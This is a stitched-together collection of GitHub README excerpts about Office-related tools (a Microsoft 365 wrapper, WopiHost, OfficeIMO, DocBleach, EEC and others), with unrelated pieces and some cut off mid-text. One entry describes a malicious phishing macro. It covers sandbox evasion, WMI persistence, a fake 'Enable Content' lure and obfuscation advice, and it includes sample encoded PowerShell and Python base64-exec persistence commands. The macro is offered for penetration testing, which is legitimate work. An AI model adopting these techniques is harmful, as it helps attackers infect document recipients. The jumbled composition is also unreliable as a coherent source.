This project is basically a Desktop wrapper for the web version of [Microsoft 365](https://microsoft365.com), which is free but with some basic limits.

I initially made this project because I wanted to use Microsoft 365 on my Linux system with a native experience. Later, I decided to make it public so that others can enjoy this too!

Don't expect this to be a full-fledged Microsoft 365 Desktop Suite (like we have for Windows/macOS), it's just a wrapper of the web version of Microsoft 365.

Note - Windows Hello or Sign in with Security key is **not** supported and will show you an error. You will have to manually sign in with your E-Mail and Password.

***Do Expect bugs***

Supported Platforms

1. Windows x64 (EXE File)
2. macOS x64 (DMG File)
3. Ubuntu/Debian based distributions (DEB File)
4. Red Hat Linux/Fedora based distributions (RPM File)
5. Arch/Manjaro Linux based distributions (Uploaded on AUR)
6. Gentoo Linux (Unofficial overlay)
7. All Distributions supporting AppImage (AppImage File); and
8. All Distributions supporting Snap (Uploaded on Snap Store)

A plugin for the [Summernote](https://github.com/summernote/summernote/) WYSIWYG editor.

summernote-cleaner removes the unnecessary and possibly layout breaking Crud that gets added by MSWord, Open Office, and Libre Office Documents.

The plugin can function in a couple of different ways. It can have a Toolbar Button which allows the Cleaning of the Editor's Text, or Pasted Text can be Cleaned when Pasted into the Text Editor.

The plugin can also limit the number of characters, with options to display text and/or HTML count in the status bar area.

Introduction
==========
This project is a sample implementation of a WOPI host. Basically, it allows developers to integrate custom datasources with Office Online Server (formerly Office Web Apps) or any other WOPI client by implementing a bunch of interfaces.

Features / improvements compared to existing samples on the web
-----------------------
 - clean WebAPI built with ASP.NET Core MVC (no references to System.Web)
 - uses new ASP.NET Core features (configuration, etc.)
 - can be self-hosted or run under IIS
 - file manipulation is extracted to own layer of abstraction (there is no dependency on System.IO)
   - example implementation included (provider for Windows file system)
   - file identifiers can be anything (doesn't have to correspond with the file's name in the file system)
 - custom token authentication middleware
 - DI used everywhere
 - URL generator
   - based on a WOPI discovery module
 - all references are NuGets
 
Usage
=====

Prerequisites
-------------
 - [.NET 7 SDK](https://dotnet.microsoft.com/download/dotnet/7.0)
 - Recommended: [VS Code](https://code.visualstudio.com/) or [Visual Studio 2022](https://visualstudio.microsoft.com/vs/)

Building the app
----------------
The WopiHost app targets `net7.0` exclusively.

If you need a version that's targeting an older version of .NET, check out the releases:
- [.NET 6](TBD)
- [.NET 5](https://github.com/petrsvihlik/WopiHost/releases/tag/3.0.0)
- [.NET Core 2.1 + .NET Framewokr 4.6](https://github.com/petrsvihlik/WopiHost/releases/tag/1.0.0)
- [.NET Core 3.1 + .NET Standard 2.1](https://github.com/petrsvihlik/WopiHost/releases/tag/2.0.0)

If you get errors saying that Microsoft.CobaltCore.*.nupkg can't be found, then just remove the reference or see the chapter [Cobalt](#Cobalt) below.
 
Configuration
-----------

### WopiHost
[WopiHost\appSettings.json](https://github.com/petrsvihlik/WopiHost/blob/master/WopiHost/appsettings.json)

| Parameter | Sample value | Description |
| :--- | :--- | :--- |
|`Wopi:StorageProviderAssemblyName`| [`""WopiHost.FileSystemProvider""`](https://github.com/petrsvihlik/WopiHost/tree/master/WopiHost.FileSystemProvider) | Name of assembly containing implementation of `WopiHost.Abstractions` interfaces |
|`Wopi:StorageProvider:RootPath` | [`"".\\wopi-docs""`](https://github.com/petrsvihlik/WopiHost/tree/master/WopiHost/wwwroot/wopi-docs) | Provider-specific setting used by `WopiHost.FileSystemProvider` (which is an implementation of `IWopiStorageProvider` working with System.IO) |
|`Wopi:UseCobalt`| `true`| Whether or not to use [MS-FSSHTTP](https://docs.microsoft.com/en-us/openspecs/sharepoint_protocols/ms-fsshttp/) for file synchronization. More details at [Cobalt](#cobalt)|

### WopiHost.Web
[WopiHost.Web\appSettings.json](https://github.com/petrsvihlik/WopiHost/blob/master/WopiHost.Web/appsettings.json)

| Parameter | Sample value | Description |
| :--- | :--- | :--- |
| `Wopi:HostUrl` | `""http://wopihost:5000""` | URL pointing to a WopiHost instance (above). It's used by the URL generator. |
| `Wopi:ClientUrl` | ` ""http://owaserver""` | Base URL of your WOPI client - typically, [Office Online Server](#compatible-wopi-clients) - used by the discovery module to load WOPI client URL templates |
| `Wopi:StorageProvider:RootPath` | [`""..\\..\\WopiHost\\wwwroot\\wopi-docs""`](https://github.com/petrsvihlik/WopiHost/tree/master/WopiHost/wwwroot/wopi-docs) | Provider-specific setting used by `WopiHost.FileSystemProvider` (which is an implementation of `IWopiStorageProvider` working with System.IO) |
| `Wopi:Discovery:NetZone` | `""InternalHttp""` | Determines the target zone configuration of your [OOS Deployment](https://docs.microsoft.com/en-us/officeonlineserver/deploy-office-online-server). Values correspond with the [`NetZoneEnum`](https://github.com/petrsvihlik/WopiHost/blob/master/WopiHost.Discovery/NetZoneEnum.cs). |


Additionally, you can use the [secret storage](https://docs.microsoft.com/en-us/aspnet/core/security/app-secrets?view=aspnetcore-2.2&tabs=windows) to configure both of the apps.

Running the application
-----------------------
Once you've successfully built the app you can:

- run it directly from the Visual Studio using [IIS Express or self-hosted](/img/debug.png?raw=true).
  - make sure you run both `WopiHost` and `WopiHost.Web`. You can set them both as [startup projects](/img/multiple_projects.png?raw=true)
- run it from the `cmd`
  - navigate to the WopiHost folder and run `dotnet run`
- run it in IIS (tested in IIS 8.5)
  - TODO

Compatible WOPI Clients
-------
Running the application only makes sense with a WOPI client as its counterpart. WopiHost is compatible with the following clients:

 - Office Online Server 2016 ([deployment guidelines](https://docs.microsoft.com/en-us/officeonlineserver/deploy-office-online-server))
 - Office Online https://learn.microsoft.com/en-us/microsoft-365/cloud-storage-partner-program/online/

Note that WopiHost will always be compatible only with the latest version of OOS because Microsoft also [supports only the latest version](https://docs.microsoft.com/en-us/officeonlineserver/office-online-server-release-schedule).

The deployment of OOS/OWA requires the server to be part of a domain. If your server is not part of any domain (e.g. you're running it in a VM sandbox) it can be overcome by promoting your machine to a [Domain Controller](https://social.technet.microsoft.com/wiki/contents/articles/12370.windows-server-2012-set-up-your-first-domain-controller-step-by-step.aspx).
To test your OWA server [follow the instructions here](https://docs.microsoft.com/en-us/office/troubleshoot/administration/test-viewing-documents-by-using-office-online-server-viewer).
To remove the OWA instance use [`Remove-OfficeWebAppsMachine`](http://sharepointjack.com/2014/fun-configuring-office-web-apps-2013-owa/).

Cobalt
------
In the past (in Office Web Apps 2013), some HTTP actions required support of MS-FSSHTTP protocol (also known as ""cobalt""). This is no longer true with Office Online Server 2016.
However, if the WOPI client discovers (via [SupportsCobalt](https://docs.microsoft.com/en-us/microsoft-365/cloud-storage-partner-program/rest/files/checkfileinfo#supportscobalt) property) that the WOPI host supports cobalt, it'll take advantage of it as it's more efficient.

If you need or want your project to use Cobalt, you'll need to [create a NuGet package called Microsoft.CobaltCore.nupkg](https://github.com/petrsvihlik/WopiHost/wiki/Craft-your-own-Microsoft.CobaltCore-NuGet-package) containing Microsoft.CobaltCore.dll. This DLL is part of Office Web Apps 2013 / Office Online Server 2016 and its license doesn't allow public distribution and therefore it's not part of this repository. Please always make sure your OWA/OOS server and user connecting to it have valid licenses before you start using it.

## What it's all about

This is a small project (under development) that allows to create Microsoft Word documents (.docx) using .NET.
Underneath it uses [OpenXML SDK](https://github.com/OfficeDev/Open-XML-SDK) but heavily simplifies it.
It was created because working with OpenXML is way too hard for me, and time consuming.
I created it for use within the PowerShell module called [PSWriteOffice](https://github.com/EvotecIT/PSWriteOffice),
but thought it may be useful for others to use in the .NET community.

If you want to see what it can do take a look at this [blog post](https://evotec.xyz/officeimo-free-cross-platform-microsoft-word-net-library/).

I used to use the DocX library (which I co-authored/maintained before it was taken over by Xceed) to create Microsoft Word documents,
but it only supports .NET Framework, and their newest community license makes the project unusable.

*As I am not really a developer, and I hardly know what I'm doing if you know how to help out - please do.*

- If you see bad practice, please open an issue/submit PR.
- If you know how to do something in OpenXML that could help this project - please open an issue/submit PR
- If you see something that could work better - please open an issue/submit PR
- If you see something that I made a fool of myself - please open an issue/submit PR
- If you see something that works not the way I think it works - please open an issue/submit PR

I hope you get the drift? If it's bad - open an issue/fix it! I don't know what I'm doing!
The main thing is - it has to work with .NET Framework 4.7.2, .NET Standard 2.0 and so on.

**This project is under development and as such there's a lot of things that can and will change, especially if some people help out.**

This short example show how to create Word Document with just one paragraph with Text and few document properties.

```csharp
string filePath = @""C:\Support\GitHub\PSWriteOffice\Examples\Documents\BasicDocument.docx"";

using (WordDocument document = WordDocument.Create(filePath)) {
    document.Title = ""This is my title"";
    document.Creator = ""Przemysław Kłys"";
    document.Keywords = ""word, docx, test"";

    var paragraph = document.AddParagraph(""Basic paragraph"");
    paragraph.ParagraphAlignment = JustificationValues.Center;
    paragraph.Color = SixLabors.ImageSharp.Color.Red;

    document.Save(true);
}
```

### Basic Document with Headers/Footers (first, odd, even)

This short example shows how to add headers and footers to Word Document.

```csharp
using (WordDocument document = WordDocument.Create(filePath)) {
    document.Sections[0].PageOrientation = PageOrientationValues.Landscape;
    document.AddParagraph(""Test Section0"");
    document.AddHeadersAndFooters();
    document.DifferentFirstPage = true;
    document.DifferentOddAndEvenPages = true;

    document.Sections[0].Header.First.AddParagraph().SetText(""Test Section 0 - First Header"");
    document.Sections[0].Header.Default.AddParagraph().SetText(""Test Section 0 - Header"");
    document.Sections[0].Header.Even.AddParagraph().SetText(""Test Section 0 - Even"");

The typical PowerPoint presentation isn't very interesting. Walls of text or bullet points, with few visuals - it's no wonder audiences find it hard to pay attention.
Your slides don't have to be this way, and it doesn't take a whole lot of effort to make them better.

aghorler,Windows-10-Hardening,,https://github.com/aghorler/Windows-10-Hardening,https://api.github.com/repos/Windows-10-Hardening/aghorler,An admittedly frivolous (and infrequently updated) attempt to harden Windows 10.,"# Windows-10-Hardening

**Important note: I update this project infrequently. Anyone who wishes to contribute more frequently is welcome.**

A collective resource of settings modifications (*mostly opt-outs*) that attempt to make Windows 10 as private and as secure as possible.

### Running

Download [all.bat](https://raw.githubusercontent.com/aghorler/Windows-10-Hardening/master/all.bat), make any required modifications, and run the script as administrator.

Reboot.

### Issues

1. Group policy registry references often change after major updates. This requires updates to these scripts.

2. Many of these modifications are mere *opt-outs*, and are not means to ensure Microsoft are unable to collect telemetry data.

shadz3rg,php-stamp,,https://github.com/shadz3rg/php-stamp,https://api.github.com/repos/php-stamp/shadz3rg,The XSL-way templating library for MS Office Word DOCX documents.,"PHPStamp
=========
Your donations are always appreciated!  
[![Donate](https://img.shields.io/badge/Donate-PayPal-green.svg)](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=6L3DRXVG67Z2N&currency_code=EUR&amount=2&source=url)  

PHPStamp is a simple PHP templating engine for XML-based Microsoft Word documents.  
Library aims to provide native XML-way of templating for DOCX documents as an altenative to treating its content as a string for regex replacing, which has a lot of downsides.  
Instead it tries to clean messy WYSIWYG-generated code and create reusable XSL stylesheet from document.  

Some additional information:  
(EN) https://redd.it/30conp  
(RU) http://habrahabr.ru/post/244421/  
 
Features
----
  - Caching XSL template to filesystem for fast document render.
  - Track document mode - generate and cache new template if original document was updated.
  - Configurable brackets for placeholder tags.
  - Basic extension system, which helps generating content blocks such as Cells or ListItems.

Known issues
----
Values inserted into placeholder tags may be highlighted as incorrect by spellcheck, since library removes language attribute and MS Word tries to check it with system language.

Requirements
----
Library requires PHP 5.3+ with DOM, XSL and Zip extensions.  
Also depends on ```doctrine2/Lexer``` package.

Installation
----
Install with Composer.

`composer require shadz3rg/php-stamp`

Usage
----

Do you want to
+ get better at programming? :computer:
+ network
+ improve job prospects
+ listen to cool talks
+ meet amazing people.

WELL THEN…you should go to some tech meetups all over the Bay Area! But there's so many, you protest!

As a summer intern in *SoMa*, I attended up to four meetups a week sometimes because I loved the lively discussions with engineers, evangelists, designers, students, and meeting people from all over the globe. I relished office visits, swag, raffles, talks, workshops, and just the atmosphere in general.

I have been to most of the meetups listed here, and heard of all of these—you can probably tell the ones I enjoy and recommend based on emoji usage!

## Find meetups :collision:
With an endless supply of meetups (not just tech-related), and meetups all over the world, [Meetup.com](https://www.meetup.com) is A+. Many of the meetups here are monthly, weekly, or meet routinely. Similarly, I also recommend [Eventbrite](https://www.eventbrite.com), and [Facebook](https://www.facebook.com) also has a few, which I often find in tech related groups (Hackathon Hackers, Ladies Storm Hackathons, but more often, in their subgroups, often targeted at location or platform ie iOS, web, IoT, etc.)

## Networking
Whatever can you talk about with people at meetups? If it’s an iOS meetup, I’m guessing you’re both interested in iOS. If it’s at, say, GitHub, there are always cool stickers and the Octocat statue. Get out of your comfort zone! :scream:
<br>
<br>
Add people on LinkedIn and Twitter. Don’t be afraid to ask for business cards or emails or anything. Chances are, you’ll see these people at future meetups, or at other tech meetups around SF. I’m surprised at how tight-knit some of the meetups, or developer community/ies in general are!

## Speaking

+ Web: [React Native](https://docs.google.com/forms/d/e/1FAIpQLScKi1v_49wcobNZjfC5ELZV0dZvORZ4ZEGsf4iiDTAtCS5gzw/viewform?c=0&w=1), [WaffleJS](https://wafflejs.com/speakers)

mgeeky,RobustPentestMacro,,https://github.com/mgeeky/RobustPentestMacro,https://api.github.com/repos/RobustPentestMacro/mgeeky,"This is a rich-featured Visual Basic macro code for use during Penetration Testing assignments, implementing various advanced post-exploitation techniques.","## RobustPentestMacro

This is a rich-featured Visual Basic macro code for use during Penetration Testing assignments, implementing various advanced post-exploitation techniques like sandbox evasion, WMI persistence and ~~page substitution~~. Intended to be able to infect both Windows and Mac OS X Office platforms by implementing platform-detection logic.

Created to make it possibly to simply _Paste Payload then Copy & Paste entire macro_ into phished document.

For list of example Macro generation and usage scenarios one can check out author's gist here:

[Various-Macro-Based-RCEs.md](https://gist.github.com/mgeeky/9dee0ac86c65cdd9cb5a2f64cef51991)


---

### SYNOPSIS:

This is a skeleton code for the malicious Macro that could
be used during Penetration Testing assignments (or for education
purposes), in order to embed it within Phishing documents as a
Microsoft Office macro.

There are following features implemented:

- **Platform detection logic (Windows/MacOS X)** - All the penetration tester has to do, is to generate both Windows and Mac OS X commands and put them into appropriate macro's functions: `WindowsMalware()` and `MacMalware()`
- **Sandbox detection** (Windows) - allowing to exit macro when being scanned
- **WMI Subscription persistence** (Windows) - allowing to survive system restart
- **Social Engineering trick by shape removing** - for hiding fake ""Enable Content"" warning.
- **Supporting both MSWORD and EXCEL startup routines**


> One should definitely feed this script into some kind of 
> Visual Basic obfuscator, like the author's one:
>	[VisualBasicObfuscator](https://github.com/mgeeky/VisualBasicObfuscator)

The macro's code has been built up from other author's building blocks:
- [WMIPersistence.vbs](https://gist.github.com/mgeeky/d00ba855d2af73fd8d7446df0f64c25a)
- [MacroDetectSandbox.vbs](https://gist.github.com/mgeeky/61e4dfe305ab719e9874ca442779a91d)


---

### CONFIGURATION

The most essential configuration here is filling up functions like `MalwareWindows()` and `MalwareMac()`.
One can for instance leverage **Empire** stager's functionality and obtain two payloads - for:
- `windows/macro`
- `osx/macro`

Then one have to put this way generated macros into aforementioned `Malware*()` functions. The penetration tester also can use buil-in primitives like:
- `ExecuteCommand(command)`
- `ExecuteCommandAndPersist command, startupTaskName`

For instance, such modifications to the script could look like:

```
Private Sub WindowsMalware()
	[...]
	str = ""powershell -noP -sta -w 1 -enc  ABCDEFGHIJKLMNOPQ""
    str = str + ""ABCDEFGHIJKLMNOPQRSTUWXYZ0123456789""
    ' Rest of the powershell command cut for brevity
    ' [...]
    str = str + ""ABCDEFGHIJKLMNOPQRSTUWXYZ0123456789""
    
    ExecuteCommandAndPersist str, """"
End Sub

Private Sub MacMalware()  
	[...]
	cmd = ""abcdefghijlmnopqrstuxwyz012345678990""
    cmd = cmd + ""abcdefghijlmnopqrstuxwyz012345678990""
    ' Rest of bash command cut for brevity
    ' [...]
    cmd = cmd + ""abcdefghijlmnopqrstuxwyz012345678990""
    
    Dim fullCommand As String
    fullCommand = ""echo """"import sys,base64;exec(base64.b64decode(\"""" "" & cmd & "" \""""));"""" | python &""

    ExecuteCommandAndPersist fullCommand, """"
```

Also, there are `Const` options documented within code's CONFIGURATION section that are self-explanatory and left to be reviewed by the user.

---

### SOCIAL ENGINEERING SHAPE REMOVAL:

In order to leverage this feature, one has to prepare a fake ""_Enable Content_"" warning message
like for instance Microsoft Office compatibility issues, AV scanned flag or something imaginary,
and then to create a shape consisting of TextBox (via INSERT -> Shapes... -> TextBox). Then cover
the document with this shape. Having that, one has to rename that shape using the path:
	
`(Ribbon -> HOME -> Editing -> Select... -> Selection Pane -> give it a name, like ""**warning-div**"")`

After that, the shape can be further modified to be floating and cover up entire document by clicking:
		
`Right click on shape -> Move selected shape -> then setting up Position and Size to 100%, Left-Top aligned.`

Among various _Social Engineering_ shapes that could be used - two of them had been attached to this repository:

![Example shape](1.png ""Example Shape"")

### TODO:

- Add **OpenOffice** platform detection and autorun logic (`OnOpen`), then modify OS detection if's to support `getGUItype` method offered by OpenOffice.
- Add document layout switching functionality, like the original page subsitute function did.
- Implement host reconnaissance and situation exfil functionality
- Refactor the code to make it a bit less detectable by AVs
- Add architecture bitness detection logic and specific payload usage
- ~~Add macOS related function for platform indepency~~

docbleach,DocBleach,docbleach,https://github.com/docbleach/DocBleach,https://api.github.com/repos/DocBleach/docbleach,":shower: Sanitising your documents, one threat at a time. — Content Disarm & Reconstruction Software","<p align=""center"">
  <img src=""logo.png""/>
</p>


DocBleach is an advanced Content Disarm and Reconstruction software.
Its objective is to remove misbehaving dynamic content from your Office
files, or everything that could be a threat to the safety of your computer.

[![Build Status][travis_img]][travis_link]

Let's assume your job involves working with files from external sources, for
instance reading resumes from unknown applicants. You receive for example a .doc
file, your anti-virus doesn't detect it as harmful, and you decide to open it
anyway. You get infected.
You can use DocBleach to sanitize this document: chances are you don't get
infected, because the dynamic content isn't run.

# Howto's
To build DocBleach, use Maven:
```bash
$ mvn clean package
...
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 10.696 s
[INFO] Finished at: 2016-12-19T17:36:10+01:00
[INFO] Final Memory: 29M/234M
[INFO] ------------------------------------------------------------------------
```
The final jar is stored in `cli/target/docbleach.jar`.


To use DocBleach, you may either use the [Web Interface][webI] or run it in CLI:
```bash
java -jar docbleach.jar -in unsafe_document.doc -out safe_doc.doc
```

The input file may be a relative/absolute path, an URI (think: http:// link),
or a dash (`-`).

The output file may be a relative/absolute path, or a dash (`-`).

If a dash is given, the input will be taken from stdin, and the output will be
sent to stdout.

DocBleach's information (removed threats, errors, ...) are sent to stderr.

[Advanced usage][wiki-adv-usage]

## Get the sources

```bash
    git clone https://github.com/docbleach/DocBleach.git
    cd DocBleach
    mvn install
    # Import it as a Maven project in your favorite IDE
```

You've developed a new cool feature ? Fixed an annoying bug ? We'd be happy
to hear from you !

## Run the tests
The tests run with JUnit 5, which is perfectly integrated in Maven.
To run tests, just run `mvn test`. You should get something similar to this:

```

# Project Status

Don't expect the code base to change everyday, but feel free to contribute: new ideas are more than
welcome,  and threats evolve - so should we.

Some things would be awesome, though:
- Adding a way to configure bleaches
- Write tests!
- Writing more content to show and explain how the sanitation process works, why it works.
- Adding more stats!

<a href=""https://github.com/ardata-fr/mschart""><img src=""man/figures/logo.png"" alt=""mschart logo"" align=""right"" /></a>
The `mschart` package provides a framework for easily create charts for
‘Microsoft PowerPoint’ presentations and ‘Microsoft Word’ documents. It
has to be used with package
[`officer`](https://davidgohel.github.io/officer/) that will produce the
charts in new or existing PowerPoint or Word documents. With ‘Microsoft
Charts’, the data is integrated into the document and linked to the
chart. The result can be edited, annotated and resized. If the data is
updated in the document, the chart is also updated.

## Example

This is a basic example which shows you how to create a scatter plot.

``` r
library(mschart)
scatter <-
  ms_scatterchart(
    data = iris, x = ""Sepal.Length"",
    y = ""Sepal.Width"", group = ""Species""
  )
scatter <- chart_settings(scatter, scatterstyle = ""marker"")
```

Then use package `officer` to send the object as a chart.

``` r
library(officer)
doc <- read_pptx()
doc <- add_slide(doc, layout = ""Title and Content"", master = ""Office Theme"")
doc <- ph_with(doc, value = scatter, location = ph_location_fullsize())

print(doc, target = ""example.pptx"")
```

At any moment, you can type `print(your_chart, preview = TRUE)` to
preview the chart in a temporary PowerPoint file. This requires to have
a PowerPoint Viewer installed on the machine.

## Installation

You can get the development version from GitHub:

``` r
devtools::install_github(""ardata-fr/mschart"")
```

Or the latest version on CRAN:

``` r
install.packages(""mschart"")
```

wangguanquan,eec,,https://github.com/wangguanquan/eec,https://api.github.com/repos/eec/wangguanquan,A fast and lower memory excel write/read tool.一个非POI底层，支持流式处理的高效且超低内存的Excel读写工具,"# EEC介绍

[![Release][release-image]][releases] [![License][license-image]][license]

EEC（Excel Export Core）是一款轻量且高效的Excel读写工具，它具有包体小、接入代码量少和运行时消耗资源少等优点

EEC的设计初衷是为了解决Apache POI内存高、速度慢且API臃肿的诟病。EEC的底层并不依赖POI包，所有的底层代码均自己实现，事实上EEC仅依赖`dom4j`和`slf4j`，前者用于小文件xml读取，后者统一日志接口。

EEC在JVM参数`-Xmx10m -Xms10m`下读写100w行x29列内存使用截图，下载 [eec-benchmark](https://github.com/wangguanquan/eec-benchmark) 项目进行性能测试

![write_read 100w](./images/write_read_100w.jpg)

## 现状

EEC支持大多数日常应用场景，最擅长的是表格处理，比如转对象数组、转Map数组、内容检查等导入/导出常见功能。

目前已实现worksheet类型有六种，也可以继承已有[Worksheet](./src/main/java/org/ttzero/excel/entity/Sheet.java)来实现自定义数据源

- [ListSheet](./src/main/java/org/ttzero/excel/entity/ListSheet.java) // 对象数组
- [ListMapSheet](./src/main/java/org/ttzero/excel/entity/ListMapSheet.java) // Map数组
- [StatementSheet](./src/main/java/org/ttzero/excel/entity/StatementSheet.java) // PreparedStatement
- [ResultSetSheet](./src/main/java/org/ttzero/excel/entity/ResultSetSheet.java) // ResultSet支持(多用于存储过程)
- [EmptySheet](./src/main/java/org/ttzero/excel/entity/EmptySheet.java) // 空worksheet
- [CSVSheet](./src/main/java/org/ttzero/excel/entity/CSVSheet.java) // 支持csv与xlsx互转

## 主要功能

1. 支持**大数据量导出**，行数无上限，超过单个Sheet上限会自动分页
2. **超低内存**，无论是xlsx还是xls格式，大部分情况下可以在10MB以内完成十万级甚至百万级行数据读写
3. 支持动态样式，如导出库存时将低于预警阈值的行背景标黄显示
4. 支持一键设置斑马线，利于阅读
5. **自适应列宽对中文更精准**
6. 采用Stream流读文件，按需加载不会将整个文件读入到内存
7. 支持Iterator和Stream+Lambda读文件，你可以像操作集合类一样操作Excel
8. 支持csv与excel格式相互转换

## WIKI

阅读[WIKI](https://github.com/wangguanquan/eec/wiki) 了解更多用法

## 使用方法

pom.xml添加

```xml
<dependency>
    <groupId>org.ttzero</groupId>
    <artifactId>eec</artifactId>
    <version>${eec.version}</version>
</dependency>
```

## 示例

#### 1. 简单导出
对象数组导出时可以在对象上使用注解`@ExcelColumn(""列名"")`来设置excel头部信息

```java
@ExcelColumn(""渠道ID"")
private int channelId;

@ExcelColumn
private String account;
```

默认情况下导出的列顺序与字段在对象中的定义顺序一致，可以设置`colIndex`或者指定Column数组。

```java
// 创建一个名为""test object""的excel文件
new Workbook(""test object"")

    // 添加一个worksheet，可以通过addSheet添加多个worksheet
    .addSheet(new ListSheet<>(""学生信息"", students))

    // 指定输出位置，如果做文件导出可以直接输出到`respone.getOutputStream()`
    .writeTo(Paths.get(""f:/excel""));
```

#### 2. 动态样式

动态样式和数据转换是使用`@FunctionalInterface`实现，也可以使用`StyleDesign`注解，下面展示如何将低下60分的成绩输出为""不合格""并将整行标为橙色

```java
new Workbook(""2021小五班期未考试成绩"")
    .addSheet(new ListSheet<>(""期末成绩"", students
         , new Column(""学号"", ""id"", int.class)
         , new Column(""姓名"", ""name"", String.class)
         , new Column(""成绩"", ""score"", int.class, n -> (int) n < 60 ? ""不合格"" : n)
    ).setStyleProcessor((o, style, sst) -> 
            o.getScore() < 60 ? Styles.clearFill(style) | sst.addFill(new Fill(PatternType.solid, Color.orange)) : style)
    ).writeTo(Paths.get(""f:/excel""));
```

效果如下图

![期未成绩](images/dynamic_style.png)

#### 3. 自适应列宽更精准

```java
// 测试类
public static class WidthTestItem {
    @ExcelColumn(value = ""整型"", format = ""#,##0_);[Red]-#,##0_);0_)"")
    private Integer nv;
    @ExcelColumn(""字符串(en)"")
    private String sen;
    @ExcelColumn(""字符串(中文)"")
    private String scn;
    @ExcelColumn(value = ""日期时间"", format = ""yyyy-mm-dd hh:mm:ss"")
    private Timestamp iv;
}

new Workbook(""Auto Width Test"")
    .setAutoSize(true) // 自动列宽
    .addSheet(new ListSheet<>(randomTestData()))
    .writeTo(Paths.get(""f:/excel""));
```
![自动列宽](./images/auto_width.png)

#### 4. 支持多行表头

EEC使用多个ExcelColumn注解来实现多级表头，名称一样的行或列将自动合并

```java
 public static class RepeatableEntry {
    @ExcelColumn(""运单号"")
    private String orderNo;
    @ExcelColumn(""收件地址"")
    @ExcelColumn(""省"")
    private String rProvince;
    @ExcelColumn(""收件地址"")
    @ExcelColumn(""市"")
    private String rCity;
    @ExcelColumn(""收件地址"")
    @ExcelColumn(""详细地址"")
    private String rDetail;
    @ExcelColumn(""收件人"")
    private String recipient;
    @ExcelColumn(""寄件地址"")
    @ExcelColumn(""省"")
    private String sProvince;
    @ExcelColumn(""寄件地址"")
    @ExcelColumn(""市"")
    private String sCity;
    @ExcelColumn(""寄件地址"")
    @ExcelColumn(""详细地址"")
    private String sDetail;
    @ExcelColumn(""寄件人"")
    private String sender;
}
```
![多行表头](./images/multi-headers.png)

#### 5. 报表轻松制作

现在使用普通的ListSheet就可以导出漂亮的报表。示例请跳转到 [WIKI](https://github.com/wangguanquan/eec/wiki/%E6%8A%A5%E8%A1%A8%E7%B1%BB%E5%AF%BC%E5%87%BA%E6%A0%B7%E5%BC%8F%E7%A4%BA%E4%BE%8B)

记帐类

![报表1](./images/report1.png)

统计类

![报表2](images/report3.png)

#### 6. 支持28种预设图片样式

导出图片时可以设置图片样式，关于图片样式请参考[1-导出Excel#导出图片](https://github.com/wangguanquan/eec/wiki/1-%E5%AF%BC%E5%87%BAExcel#%E5%AF%BC%E5%87%BA%E5%9B%BE%E7%89%87)

![effect](./images/preset_effect.jpg)

### 读取示例

EEC使用`ExcelReader#read`静态方法读文件，下面展示一些常规的读取方法

#### 1. 使用stream

```java
try (ExcelReader reader = ExcelReader.read(Paths.get(""./用户注册.xlsx""))) {
    // 读取所有worksheet并输出
    reader.sheets().flatMap(Sheet::rows).forEach(System.out::println);
} catch (IOException e) {
    e.printStackTrace();
}
```

#### 2. 读入到数组或List中

```java
try (ExcelReader reader = ExcelReader.read(Paths.get(""./User.xlsx""))) {
    // 读取第1个Sheet页
    List<User> users = reader.sheet(0)
        // 指定第6为表头，前5行为概要信息
        .header(6)
        // 读取数据行
        .rows()
        // 将每行数据转换为User象
        .map(row -> row.to(User.class))
        // 收集为List或数组进行后续处理
        .collect(Collectors.toList());
} catch (IOException e) {
    e.printStackTrace();
}
```

#### 3. 过滤和聚合

EEC支持Stream的大部分功能，以下代码展示过滤平台为""iOS""的注册用户

```java
reader.sheet(0)
    .dataRows()
    .filter(row -> ""iOS"".equals(row.getString(""platform""))) // 过滤平台为""iOS""的数据
    .map(row -> row.to(Regist.class))
    .collect(Collectors.toList());
```

#### 4. 多表头读取

多级表头读取时可以使用`header`方法来指定表头所在的行号

```java
reader.sheet(0)
    .header(1, 2) // 指定表头所在的行第1行和第二行均为表头
    .map(Row::toMap) // Row 转 Map
    .forEach(System.out::println)
```

更多关于多表头使用方法可以参考 [WIKI](https://github.com/wangguanquan/eec/wiki/%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E5%A4%9A%E8%A1%8C%E8%A1%A8%E5%A4%B4#%E8%AF%BB%E5%8F%96%E5%B8%A6%E5%A4%9A%E8%A1%8C%E8%A1%A8%E5%A4%B4%E7%9A%84%E6%96%87%E4%BB%B6)

### xls格式支持

pom.xml添加如下依赖，添加好后即完成了xls的兼容，是的你不需要为xls写任何一行代码。

```xml
<dependency>
    <groupId>org.ttzero</groupId>
    <artifactId>eec-e3-support</artifactId>
    <version>${eec-e3-support.version}</version>
</dependency>

读取xls格式的方法与读取xlsx格式完全一样，读取文件时不需要判断是xls格式还是xlsx格式，EEC为其提供了完全一样的接口，内部会根据文件头去判断具体类型， 这种方式比判断文件后缀准确得多。

两个工具的兼容性 [参考此表](https://github.com/wangguanquan/eec/wiki/EEC%E4%B8%8EE3-support%E5%85%BC%E5%AE%B9%E6%80%A7%E5%AF%B9%E7%85%A7%E8%A1%A8)

### CSV与Excel格式互转

- CSV => Excel：向Workbook中添加一个`CSVSheet`
- Excel => CSV：读Excel时调用`saveAsCSV`

代码示例

```java
// 直接保存为csv生成测试文件，对于数据量较多的场合也可以使用#more方法分批获取数据
new Workbook()
    .addSheet(createTestData())
    .saveAsCSV() // 指定输出格式为csv
    .writeTo(Paths.get(""d:\\abc.csv""));

// CSV转Excel
new Workbook()
    .addSheet(new CSVSheet(Paths.get(""d:\\abc.csv""))) // 添加CSVSheet并指定csv路径
    .writeTo(Paths.get(""d:\\abc.xlsx""));
    
// Excel转CSV
try (ExcelReader reader = ExcelReader.read(Paths.get(""d:\\abc.xlsx""))) {
    // 读取Excel使用saveAsCSV保存为CSV格式
    reader.sheet(0).saveAsCSV(Paths.get(""./""));
} catch (IOException e) {
    e.printStackTrace();
}
```

===============================

Did you ever wonder where your colleague currently is? In what Zoom.us room they hide?

Virtual Office tries to give you transparency on what Zoom.us rooms are occupied and who is currently there.

![Virtual Office Screenshot](/screenshot.png?raw=true)

### Features

* React Web UI
* Uses [Zoom.us Webhooks](https://marketplace.zoom.us/docs/guides/tools-resources/webhooks) to give a real-time status update on who currently participates in what Zoom.us room
* Login via Slack

At TNG we've also hosted a big company internal event with 450 participants using Virtual Office. If you're interested,
you can find our experiences in two articles (German only):

#### Office Configuration

You can find an example office definition in `server/office.json`.

An example looks like this:

```json
{
